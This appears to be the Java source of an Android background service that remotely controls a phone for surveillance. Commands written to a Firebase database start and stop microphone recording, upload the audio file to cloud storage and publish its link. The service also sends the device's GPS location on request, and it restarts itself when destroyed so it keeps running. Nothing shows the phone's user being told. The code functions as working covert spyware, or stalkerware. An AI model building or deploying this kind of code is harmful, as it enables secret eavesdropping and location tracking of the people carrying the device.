package com.example.aropc.myapplication.services;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.example.aropc.myapplication.Consts;
import com.example.aropc.myapplication.UserApp;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;

import static com.example.aropc.myapplication.Consts.DATABASE_NAME;
import static com.example.aropc.myapplication.Consts.USERS_STORAGE_NAME;
import static com.example.aropc.myapplication.Consts.USER_MODEL_LOCATION;
import static com.example.aropc.myapplication.Consts.USER_MODEL_VOICE_URL;
import static com.example.aropc.myapplication.Consts.VOICE_STORAGE;


/**
 * Created by Aro-PC on 5/22/2017.
 */

public class BackgroundService extends Service implements ValueEventListener {

    public static final String TAG = "tag";
    private LocationManager mLocationManager = null;
    private static final int LOCATION_INTERVAL = 1000;
    private static final float LOCATION_DISTANCE = 10f;
    private FirebaseUser user;
    private FirebaseDatabase firebaseDatabase;
    private DatabaseReference reference;
    private StorageReference storageReference;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        uid = intent.getStringExtra("uid");

        return null;
    }

    private String uid;

    @Override
    public void onDestroy() {
        super.onDestroy();
        firebaseDatabase.getReference(DATABASE_NAME).child(UserApp.readFromFile(getApplicationContext(),Consts.FILE_NAME_UID)).child(Consts.USER_MODEL_BACKGROUND).setValue("false");
        this.startService(new Intent(getApplicationContext(),BackgroundService.class));
    }

    @Override
    public void onCreate() {

        FirebaseApp.initializeApp(getApplicationContext());
        FirebaseApp.initializeApp(this);
        uid = UserApp.readFromFile(getApplicationContext(),Consts.FILE_NAME_UID);
//        uid = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString(SHARED_PREFERANCES_UID,"");

        firebaseDatabase = FirebaseDatabase.getInstance();
        firebaseDatabase.getReference(DATABASE_NAME).child(uid).child(Consts.USER_MODEL_BACKGROUND).setValue("true");

        initializeLocationManager();
        try {
            mLocationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER, LOCATION_INTERVAL, LOCATION_DISTANCE,
                    mLocationListeners[1]);
            mLocationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER, LOCATION_INTERVAL, LOCATION_DISTANCE,
                    mLocationListeners[0]);
        } catch (java.lang.SecurityException ex) {
        } catch (IllegalArgumentException ex) {
        }
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                setRocorderListener();

            }
        },10000);



        super.onCreate();
    }

    private void setRocorderListener() {

        mFileName = getFilesDir().getAbsolutePath();
        mFileName += "/audiorecordtest.3gp";
        reference = firebaseDatabase.getReference(DATABASE_NAME).child(uid).child(Consts.USER_MODEL_VOICE);
        storageReference = FirebaseStorage.getInstance().getReference();
        reference.addValueEventListener(this);

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public ComponentName startService(Intent service) {

        return super.startService(service);
    }


    private void sentToServer(Location loc) {
        JSONObject jsonObject = createJson(loc);
        if (loc != null)
            firebaseDatabase.getReference(DATABASE_NAME).child(uid).child(USER_MODEL_LOCATION).setValue(jsonObject.toString());
//        else
//            firebaseDatabase.getReference(DATABASE_NAME).child(uid).child(USER_MODEL_LOCATION).setValue("location");

    }

    private JSONObject createJson(Location loc) {
        if (loc == null) return null;
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("Lat:", loc.getLatitude());
            jsonObject.put("Lng:", loc.getLongitude());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject;
    }

    private void initializeLocationManager() {
        Log.e(TAG, "initializeLocationManager");
        if (mLocationManager == null) {
            mLocationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        }
    }

    public Location getmLastLocation() {
        return mLastLocation;
    }

    public void setmLastLocation(Location mLastLocation) {
        this.mLastLocation = mLastLocation;
    }

    private Location mLastLocation = null;

    @Override
    public void onDataChange(DataSnapshot dataSnapshot) {
        switch (dataSnapshot.getValue(String.class)){
            case Consts.START_LISTEN:
                Log.d(Consts.USER_MODEL_VOICE, Consts.START_LISTEN);
                startVoiceRecording();
                break;
            case Consts.STOP_LISTEN:
                Log.d(Consts.USER_MODEL_VOICE, Consts.STOP_LISTEN);
                stopVoiceRecording();
                break;
            case Consts.GET_RECORD:
                Log.d(Consts.USER_MODEL_VOICE, Consts.GET_RECORD);
                setndRecordToServer();
                break;
            default:

                break;
        }
    }

    private void setndRecordToServer() {
        Uri file = Uri.fromFile(new File(mFileName));
        StorageReference storageReference1 = storageReference.child(USERS_STORAGE_NAME).child(uid).child(VOICE_STORAGE);
        storageReference1.putFile(file).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                Uri downloadUrl = taskSnapshot.getDownloadUrl();
                reference.getParent().child(USER_MODEL_VOICE_URL).setValue(String.valueOf(downloadUrl));
            }
        });
    }

    private void stopVoiceRecording() {
        stopRecording();
//        startPlaying();
    }

    private void startVoiceRecording() {
        startRecording();
    }

    @Override
    public void onCancelled(DatabaseError databaseError) {

    }

    private class LocationListener implements android.location.LocationListener {

        public LocationListener(String provider) {
            Log.e(TAG, "LocationListener " + provider);
            setmLastLocation(null);
        }

        @Override
        public void onLocationChanged(Location location) {
            Log.e(TAG, "onLocationChanged: " + location);
            setmLastLocation(location);
            sendDataToServerListener();



        }

        @Override
        public void onProviderDisabled(String provider) {
            Log.e(TAG, "onProviderDisabled: " + provider);
        }

        @Override
        public void onProviderEnabled(String provider) {
            Log.e(TAG, "onProviderEnabled: " + provider);
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {
            Log.e(TAG, "onStatusChanged: " + provider);
        }
    }

    private void sendDataToServerListener() {
        firebaseDatabase.getReference(DATABASE_NAME).child(uid).child(USER_MODEL_LOCATION).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                if (dataSnapshot!= null)
                if (dataSnapshot.getValue().toString().equals(Consts.GET_LOCATION_VALUE)) {
                    sentToServer(mLastLocation);

                }
            }

            @Override
            public void onCancelled(DatabaseError databaseError) {

            }
        });
    }


    LocationListener[] mLocationListeners = new LocationListener[]{
            new LocationListener(LocationManager.GPS_PROVIDER),
            new LocationListener(LocationManager.NETWORK_PROVIDER)
    };

    private static final String LOG_TAG = "AudioRecordTest";
    private static final int REQUEST_RECORD_AUDIO_PERMISSION = 200;
    private static String mFileName = null;

    private MediaRecorder mRecorder = null;

    private MediaPlayer mPlayer = null;


    private void startRecording() {
        mRecorder = new MediaRecorder();
        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mRecorder.setOutputFile(mFileName);
        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

        try {
            mRecorder.prepare();
            mRecorder.start();

        } catch (IOException e) {
            Log.e(LOG_TAG, "prepare() failed");
        }

    }

    private void stopRecording() {
        if(mRecorder != null) {
            mRecorder.stop();
            mRecorder.release();
            mRecorder = null;
        }
    }



}
